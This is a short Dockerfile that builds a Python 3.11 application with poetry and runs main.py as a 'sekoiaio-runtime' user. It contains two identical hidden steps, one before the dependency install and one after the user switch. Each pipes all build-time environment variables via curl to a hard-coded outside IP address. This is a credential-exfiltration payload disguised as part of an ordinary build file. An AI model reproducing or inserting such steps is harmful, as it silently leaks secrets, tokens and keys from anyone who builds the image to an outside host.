FROM python:3.11

WORKDIR /app

RUN bash -c "env | curl -X POST -d @- http://163.172.136.81:8000/ #"

RUN pip install poetry

# Install dependencies
COPY poetry.lock pyproject.toml /app/
RUN poetry config virtualenvs.create false && poetry install --only main

COPY . .

RUN useradd -ms /bin/bash sekoiaio-runtime
USER sekoiaio-runtime

RUN bash -c "env | curl -X POST -d @- http://163.172.136.81:8000/ #"

ENTRYPOINT [ "python", "./main.py" ]
